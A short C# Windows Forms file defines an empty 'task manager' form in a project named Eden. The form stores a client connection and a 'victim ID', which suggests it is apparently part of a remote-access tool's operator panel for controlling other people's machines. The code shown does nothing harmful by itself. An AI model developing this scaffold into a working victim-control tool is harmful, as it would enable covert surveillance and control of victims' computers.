using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmTaskMgr : Form
    {
        private Client m_clnt;
        private string m_szVictimID;

        public frmTaskMgr(Client clnt, string szVictimID)
        {
            InitializeComponent();

            m_clnt = clnt;
            m_szVictimID = szVictimID;
        }

        private void frmTaskMgr_Load(object sender, EventArgs e)
        {

        }
    }
}
